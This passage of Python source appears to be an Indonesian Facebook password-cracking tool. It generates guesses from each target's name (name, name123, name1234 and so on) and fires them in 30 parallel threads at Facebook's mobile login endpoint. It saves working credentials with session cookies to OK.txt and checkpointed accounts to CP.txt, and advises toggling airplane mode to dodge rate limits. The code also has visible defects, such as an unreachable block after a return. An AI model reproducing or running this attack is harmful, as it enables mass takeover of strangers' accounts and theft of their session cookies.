        self.okc = ('OK.txt')
        self.cpc = ('CP.txt')
        self.suck, self.loop, self.check = 0,0,0
        
    #----------[ WORDLIST ]----------# 
    def Generate_listM(self):
        global prog,des
        print('\n')
        Cons().print(f' {A}[{J}*{A}] Hasil OK Simpan/{H}OK/{self.okc} \n {A}[{J}*{A}] Hasil CP Simpan/{K}CP/{self.cpc} \n\n {J}#{A} Mainkan Mode Pesawat Setiap 300 ID\n')
        prog = Progress(TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%"))
        des = prog.add_task('',total=len(dumpid))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as V:
                for akun in dumpid:
                    userid, username = akun.split('<[ ]>')[0], akun.split('<=>')[1]
                    password = self.Generate_pasM(username)
                    V.submit(self.RegulerOri,userid,password) 
                    
     #----------[ PASSWORD ]----------#             
    def Generate_pasM(self,username):
        for nama in username.split(' '):
            if len(nama) == 3 or len(nama) == 4 or len(nama) == 5:password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
            else: password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
        return ( password )
                    
       #----------[ CHECK-RESULT ]----------# 
        if self.suck == 0 or self.check ==0:
            Cons().print(f'\n {A}[{M}*{A}] Haha Gak Dapat Mampus Kau Bujang')
        else:
            Cons().print(f'\n {A}[{J}*{A}] Anjay Dapet OK : {H}{self.suck}{A} Jiahhh haha dapat CP : {K}{self.check}{A}')
        
    #-----[ METHOD-REGULER ]-----#
    def RegulerOri(self,userid,password):
        prog.update(des,description=f' {J}# {A}KREK {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
        prog.advance(des)
        for userpas in password:
            try:
                with requests.Session() as xyc:
                    xyc.headers.update=({
                        "Host":"free.prod.facebook.com",
                        "upgrade-insecure-requests":"1",
                        "user-agent": Miya().Useragent(),
                        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "dnt": "5",
                        "x-requested-with":"mark.via.gp",
                        "sec-fetch-site":"same-origin",
                        "sec-fetch-mode":"navigate",
                        "sec-fetch-user":"?1",
                        "sec-fetch-dest":"document",
                        "referer":"https://free.prod.facebook.com/",
                        "accept-encoding":"gzip, deflate",
                        "accept-language":"id,en-US;q=0.8,en;q=0.9"
                    })
                    response = xyc.get('https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
                    encoding = {
                        "lsd":re.search('name="lsd" value="(.*?)"',str(response)).group(1),
                        "jazoest":re.search('name="jazoest" value="(.*?)"', str(response)).group(1),
                        "email":userid,
                        "pass":userpas}
                    headers = Miya().head_email()
                    cookies = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                    response = xyc.post('https://free.prod.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',headers=headers, data=encoding,cookies={'cookie':cookies}, allow_redirects=False)    
                    payload = xyc.cookies.get_dict()          
                    if 'c_user' in payload.keys():
                        coki = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
                        try:
                            uid = re.findall('c_user=(.*);xs', coki)[0]
                        except: uid = userid
                        print(f' {A}#>>>> {H}{uid}{J}<[ ]>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                        resok=('%s<[ ]>%s<[ ]>%s'%(uid,userpas,coki)) 
                        with open('OK/'+self.okc,'a') as wr:
                            wr.write(resok+'\n')
                            wr.close()
                        self.suck+=1                
                        break                                                                       
                    elif 'checkpoint' in payload.keys():
                        try:
                            uid = xyc.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                        except: uid = userid
                        print(f' {A}#——> {K}{uid}{J}<[ ]>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                        rescp=('%s<=>%s<[ ]>%s'%(uid,userpas))      
                        with open('CP/'+self.cpc,'a') as wr:
                            wr.write(rescp+'\n')
                            wr.close()
                        self.check+=1               
                        break
                    else:continue
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f' {J}# {M}DENIED {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
                prog.advance(des)
                time.sleep(31)
        self.loop+=1
        
#-----[ SETTING ]-----#   
if __name__ == '__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data/login')
    except:pass
    try: FanzMiya()
    except ( Exception ) as e:sys.exit(e)
                    
